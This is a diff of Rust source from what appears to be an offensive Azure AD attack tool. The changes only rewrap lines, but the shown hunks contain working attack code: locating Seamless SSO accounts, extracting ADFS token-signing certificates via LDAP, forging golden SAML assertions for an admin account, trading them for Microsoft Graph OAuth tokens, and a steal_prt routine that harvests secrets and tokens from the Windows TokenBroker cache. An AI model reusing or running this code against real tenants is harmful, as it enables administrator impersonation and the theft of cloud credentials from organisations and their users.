@@ -78,7 +78,10 @@ pub async fn execute_azure_ad_attack(
             log.push("Phase 2: Checking Seamless SSO account...".to_string());
             let sso_info = find_seamless_sso_info(ldap).await?;
             let sso_enabled = !sso_info.is_empty();
-            log.push(format!("  Seamless SSO: {}", if sso_enabled { "ENABLED" } else { "NOT FOUND" }));
+            log.push(format!(
+                "  Seamless SSO: {}",
+                if sso_enabled { "ENABLED" } else { "NOT FOUND" }
+            ));
             if let Some(spn) = sso_info.first() {
                 log.push(format!("  SSO SPN: {spn}"));
             }
@@ -92,7 +95,9 @@ pub async fn execute_azure_ad_attack(
             log.push("Phase 4: Checking for ADFS signing certificate...".to_string());
             match find_adfs_signing_cert(ldap).await {
                 Ok(Some((_cert_der, has_private))) => {
-                    log.push(format!("  ADFS signing cert: FOUND (private key: {has_private})"));
+                    log.push(format!(
+                        "  ADFS signing cert: FOUND (private key: {has_private})"
+                    ));
                 }
                 Ok(None) => {
                     log.push("  ADFS signing cert: NOT FOUND in AD".to_string());
@@ -123,7 +128,9 @@ pub async fn execute_azure_ad_attack(
             log.push("Phase 1: Finding Seamless SSO SPN via LDAP...".to_string());
             let sso_info = find_seamless_sso_info(ldap).await?;
             if sso_info.is_empty() {
-                log.push("  No Seamless SSO SPN found — Seamless SSO may not be deployed".to_string());
+                log.push(
+                    "  No Seamless SSO SPN found — Seamless SSO may not be deployed".to_string(),
+                );
             } else {
                 let spn = &sso_info[0];
                 log.push(format!("  Found Seamless SSO SPN: {spn}"));
@@ -151,7 +158,11 @@ pub async fn execute_azure_ad_attack(
             match find_adfs_signing_cert(ldap).await {
                 Ok(Some((cert_der, has_private))) => {
                     let uid = format!("admin@{}", config.domain);
-                    log.push(format!("  Found ADFS cert ({} bytes, key: {})", cert_der.len(), has_private));
+                    log.push(format!(
+                        "  Found ADFS cert ({} bytes, key: {})",
+                        cert_der.len(),
+                        has_private
+                    ));
                     log.push("Phase 2: Forging SAML assertion...".to_string());
 
                     match forge_golden_saml(config, &cert_der, &uid).await {
@@ -268,10 +279,7 @@ async fn perform_seamless_sso(
 
     let resp = client
         .get(&autologon_url)
-        .header(
-            "Authorization",
-            format!("Negotiate {negotiation_token}"),
-        )
+        .header("Authorization", format!("Negotiate {negotiation_token}"))
         .send()
         .await
         .map_err(|e| OverthroneError::custom(format!("Autologon request: {e}")))?;
@@ -319,9 +327,14 @@ async fn find_adfs_signing_cert(ldap: &mut LdapSession) -> Result<Option<(Vec<u8
     let base_dn = build_base_dn_from_ldap_session(ldap);
     let config_dn = format!("CN=ADFS,CN=Microsoft,CN=Program Data,{base_dn}");
 
-    if let Ok(entries) = ldap.custom_search_with_base(
-        &config_dn, "(objectClass=*)", &["tokenSigningCertificateInfo", "objectClass"]
-    ).await {
+    if let Ok(entries) = ldap
+        .custom_search_with_base(
+            &config_dn,
+            "(objectClass=*)",
+            &["tokenSigningCertificateInfo", "objectClass"],
+        )
+        .await
+    {
         for entry in &entries {
             if let Some(certs) = entry.attrs.get("tokenSigningCertificateInfo")
                 && let Some(cert_b64) = certs.first()
@@ -333,10 +346,14 @@ async fn find_adfs_signing_cert(ldap: &mut LdapSession) -> Result<Option<(Vec<u8
         }
     }
 
-    if let Ok(entries) = ldap.custom_search_with_base(
-        &config_dn, "(|(cn=ADFS Signing Certificate)(cn=TokenSigningContainer))",
-        &["certificate", "thumbnailPhoto"]
-    ).await {
+    if let Ok(entries) = ldap
+        .custom_search_with_base(
+            &config_dn,
+            "(|(cn=ADFS Signing Certificate)(cn=TokenSigningContainer))",
+            &["certificate", "thumbnailPhoto"],
+        )
+        .await
+    {
         for entry in &entries {
             if let Some(certs) = entry.attrs.get("certificate")
                 && let Some(cert_b64) = certs.first()
@@ -349,17 +366,24 @@ async fn find_adfs_signing_cert(ldap: &mut LdapSession) -> Result<Option<(Vec<u8
     }
 
     let services_dn = format!("CN=Services,CN=Configuration,{base_dn}");
-    if let Ok(entries) = ldap.custom_search_with_base(
-        &services_dn, "(&(objectClass=certificationAuthority)(cn=ADFS*))",
-        &["caCertificate", "cACertificate"]
-    ).await {
+    if let Ok(entries) = ldap
+        .custom_search_with_base(
+            &services_dn,
+            "(&(objectClass=certificationAuthority)(cn=ADFS*))",
+            &["caCertificate", "cACertificate"],
+        )
+        .await
+    {
         for entry in &entries {
             for attr_name in &["caCertificate", "cACertificate"] {
                 if let Some(certs) = entry.attrs.get(*attr_name)
                     && let Some(cert_hex) = certs.first()
                     && let Ok(cert_der) = hex::decode(cert_hex)
                 {
-                    debug!("Found ADFS CA cert via Configuration NC ({} bytes)", cert_der.len());
+                    debug!(
+                        "Found ADFS CA cert via Configuration NC ({} bytes)",
+                        cert_der.len()
+                    );
                     return Ok(Some((cert_der, false)));
                 }
             }
@@ -442,9 +466,7 @@ fn build_saml_assertion(
     );
 
     let digest_value = {
-        let canon = assertion_body
-            .replace(">\n  <", "><")
-            .replace("\n", "");
+        let canon = assertion_body.replace(">\n  <", "><").replace("\n", "");
         let mut hasher = Sha256::new();
         hasher.update(canon.as_bytes());
         base64::engine::general_purpose::STANDARD.encode(hasher.finalize())
@@ -546,10 +568,16 @@ async fn exchange_saml_for_oauth(saml_assertion: &str, tenant: &str) -> Result<V
         .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;
 
     let params = [
-        ("grant_type", "urn:ietf:params:oauth:grant-type:saml2-bearer"),
+        (
+            "grant_type",
+            "urn:ietf:params:oauth:grant-type:saml2-bearer",
+        ),
         ("assertion", saml_assertion),
         ("client_id", MS_LOGIN_CLIENT_ID),
-        ("scope", "openid email profile https://graph.microsoft.com/.default"),
+        (
+            "scope",
+            "openid email profile https://graph.microsoft.com/.default",
+        ),
     ];
 
     let resp = client
@@ -613,27 +641,32 @@ async fn steal_prt() -> Result<Vec<String>> {
                             if path.extension().and_then(|e| e.to_str()) == Some("json") {
                                 match std::fs::read_to_string(&path) {
                                     Ok(content) => {
-                                        let fname = path.file_name()
+                                        let fname = path
+                                            .file_name()
                                             .and_then(|n| n.to_str())
                                             .unwrap_or("unknown");
                                         info!("PRT cache file: {fname} ({} bytes)", content.len());
                                         creds.push(format!("prt_cache_file: {fname}"));
 
-                                        if let Ok(json) =
-                                            serde_json::from_str::<HashMap<String, serde_json::Value>>(
-                                                &content,
-                                            )
-                                        {
+                                        if let Ok(json) = serde_json::from_str::<
+                                            HashMap<String, serde_json::Value>,
+                                        >(
+                                            &content
+                                        ) {
                                             for (k, v) in &json {
                                                 if let Some(s) = v.as_str()
-                                                    && (k.contains("secret") || k.contains("key") || k.contains("token"))
+                                                    && (k.contains("secret")
+                                                        || k.contains("key")
+                                                        || k.contains("token"))
                                                 {
                                                     creds.push(format!("prt_{k}: {s:.80}"));
                                                 }
                                             }
                                         }
-                                        creds.push(format!("prt_raw: <base64>{}</base64>",
-                                            base64::engine::general_purpose::STANDARD.encode(content.as_bytes())
+                                        creds.push(format!(
+                                            "prt_raw: <base64>{}</base64>",
+                                            base64::engine::general_purpose::STANDARD
+                                                .encode(content.as_bytes())
                                         ));
                                     }
                                     Err(e) => {
@@ -649,10 +682,7 @@ async fn steal_prt() -> Result<Vec<String>> {
                 }
             }
 
-            let cloudap_path = format!(
-                r"{}\Microsoft\TokenBroker\Cache",
-                local_app_data
-            );
+            let cloudap_path = format!(r"{}\Microsoft\TokenBroker\Cache", local_app_data);
             match std::fs::read_dir(&cloudap_path) {
                 Ok(dir) => {
                     for entry in dir.flatten() {
